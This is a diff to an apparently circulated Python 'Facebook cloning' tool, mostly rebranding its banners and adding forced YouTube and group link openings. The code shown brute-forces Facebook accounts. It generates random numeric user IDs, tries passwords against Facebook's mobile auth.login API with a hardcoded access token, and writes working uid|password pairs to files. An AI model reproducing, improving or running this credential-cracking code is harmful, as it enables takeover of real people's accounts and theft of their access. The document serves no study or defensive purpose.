@@ -396,17 +396,23 @@ logo = """\033[1;30m
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[0;92m
  \033[1;31
-
+   
+  _  __               _ 
+ | |/ /              (_)
+ | ' / ___  _ __ __ _ _ 
+ |  < / _ \| '__/ _` | |
+ | . \ (_) | | | (_| | |
+ |_|\_\___/|_|  \__,_|_|
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MOHAMED SESI
-\033[1;39m━▷ \033[0;91m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m  ME ONLY
-\033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32m ALMAKER GAMER
-\033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33m MOHAMED SESI
-\033[1;39m━▷ \033[0;91m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34m NOT-USED
+\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR DIVIL
+\033[1;39m━▷ \033[0;91m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m TEAM OF KORAI-404
+\033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32mLUCKY STUDIO SEASON TIME
+\033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33mBAAP.HUN.TERA.MERY.BACHY
+\033[1;39m━▷ \033[0;91m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34mFACEBOOK ZONE 🙂
 \033[1;39m━▷ \033[0;91m𝙒𝙋 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;35mSTARTING EXIT SELECT AND JOIN
-\033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mPAID AND ENJOY
+\033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE AND ENJOY
 \033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.0
-\033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 SESI 𝙊𝙒𝙉𝙀𝙍 𝙊𝙁 MOHAMED SESI
+\033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 KORAI 𝙊𝙒𝙉𝙀𝙍 𝙊𝙁 KORAI-404
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""
  
 class Main:
@@ -416,14 +422,15 @@ class Main:
 		self.cp = []
 		self.loop = 0
 		os.system("clear")
-
+		print(logo)
 		
 		print("\033[1;33m     ●▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬▬●")
-		print("\033[1;37m                        MOHAMED SESI")
+		print("\033[1;37m     FIRST OF ALL SUBSCRIBE MY CHANNEL")
 		print("\033[1;33m     ●▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬▬●")
 		
-		
-		print("thank you for use")
+		print(" \033[1;39m━▷\033[1;32m [1] SUBSCRIBE THE CHANNEL FOR APPROVED")
+		print(" \033[1;39m━▷\033[1;31m [2] Exit")
+		print("")
 		baloch = input("\n\033[1;37m  \033[1;35mChoice \033[1;37m━━> \033[1;32m")
 		if baloch in ["", " "]:
 			exit()
@@ -432,35 +439,40 @@ class Main:
 			os.system("xdg-open http://Wa.me/+923346659277")
 			exit()
 		elif baloch in ["1", "01"]:
-			
+			os.system("xdg-open https://youtube.com/channel/UCrh9jErhYFz_6l7V-QCa7tw")
+			print("")
 			time.sleep(2.0)
-
+			print("\033[1;37m    Type Your Channel Name")
+			print("")
+			input("\n\033[1;32m  Type Name \033[1;34m━━>  \033[1;33m")
+			time.sleep(2.1)
+			print("")
 			print("\033[1;37m Successful ")
 			time.sleep(2.0)
 			os.system("clear")
 		print(logo)
 		print(" \033[1;37m[▪]Select Option")
 		print("\033[0;90m \033[1;33m●▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬●")
-		print(" \033[1;39m━▷ \033[1;31m【1】 \033[1;36mBest Crack File Cloning\033[0;92m   ✓ (DON,T USE)")
+		print(" \033[1;39m━▷ \033[1;31m【1】 \033[1;36mBest Crack File Cloning\033[0;92m   ✓ (Best)")
 		print(" \033[1;39m━▷ \033[1;32m【2】 \033[1;34mCrack Public Id's")
 		print(" \033[1;39m━▷ \033[1;33m【3】 \033[1;33mFacebook Group help ")
-		print(" \033[1;39m━▷ \033[1;34m【4】 \033[1;32mOld Cloning Id's 2007-2008 \033[0;92m ✓ (oldest)")
-		print(" \033[1;39m━▷ \033[1;35m【5】 \033[1;37mOld Cloning Id's 2008-2009\033[0;92m  ✓ (newer) ")
+		print(" \033[1;39m━▷ \033[1;34m【4】 \033[1;32mOld Cloning Id's 2006-10 \033[0;92m ✓ (Best)")
+		print(" \033[1;39m━▷ \033[1;35m【5】 \033[1;37mOld Cloning Id's 2011-16\033[0;92m  ✓ (Best) ")
 		print(" \033[1;39m━▷ \033[0;91m【E】 Exit \n")
 		MAINUL =input(" \033[1;35mChoice : ")
 		if MAINUL in ["1", "01"]:
-			
+			os.system("xdg-open https://youtube.com/channel/UCrh9jErhYFz_6l7V-QCa7tw")
 			File()
 		if MAINUL in ["2", "02"]:
-			
+			os.system("xdg-open https://youtube.com/channel/UCrh9jErhYFz_6l7V-QCa7tw")
 			Public()
 		if MAINUL in ["3", "03"]:
-			
+			os.system('xdg-open  https://facebook.com/groups/571790004363677/?ref=share')
 		if MAINUL in ["4", "04"]:
-			
+			os.system("xdg-open https://youtube.com/channel/UCrh9jErhYFz_6l7V-QCa7tw ")
 			self.old()
 		if MAINUL in ["5", "05"]:
-			
+			os.system("xdg-open https://youtube.com/channel/UCrh9jErhYFz_6l7V-QCa7tw")
 			self.old2()
 			exit()
 		else:
@@ -471,7 +483,7 @@ class Main:
 	def old(self):
 		x = 11111111
 		xx = 99999999
-		idx = "7" 
+		idx = "5" 
 		os.system("xdg-open ");print(logo)
 		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50000: "))
 		try:
@@ -884,7 +896,7 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAA" in response.text:
-				print("\r \033[0;92m[SESI-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[KORAI-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-KORAI-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
@@ -892,7 +904,7 @@ class Main:
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[KORAI-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2008-SESI-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-KORAI-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -904,7 +916,7 @@ class Main:
 		xx = 99999999
 		idx = "13" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 300,000: "))
+		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -920,10 +932,10 @@ class Main:
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("     \033[0;93m   KING MODE ACTIVATE")
-				print("\n\033[0;94m [+] THE HACK HAS BEEN START")
+				print("     \033[0;93m   FREE MODE ACTIVATE")
+				print("\n\033[0;94m [+] BRUTE HAS BEEN START")
 				print(" \033[0;96m[+] Note: Ok Open 70% just now")
-				print("                  THE KING STARTS")
+				print(" [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
 				print("\033[0;94m--------------------------------------------")
 				print("\n")
 				print("\033[0;97m")
